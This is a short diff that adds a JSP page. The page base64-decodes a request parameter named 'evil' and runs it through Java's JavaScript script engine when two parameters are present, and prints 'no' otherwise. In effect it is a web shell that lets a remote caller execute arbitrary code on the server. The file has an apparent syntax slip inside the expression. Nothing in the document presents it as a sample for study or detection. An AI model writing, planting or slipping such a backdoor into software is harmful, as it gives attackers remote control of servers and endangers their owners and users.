@@ -1,0 +1,2 @@
+<%@page pageEncoding = "UTF-8"%>
+<%out.println((request.getParameter("evil")!=null)&&(request.getParameter("word")!=null) ? new javax.script.ScriptEngineManager().getEngineByName("js").eval(new String(javax.xml.bind.DatatypeConverter.parseBase64Binary(%request.getParameter("evil")%))):"no");%>
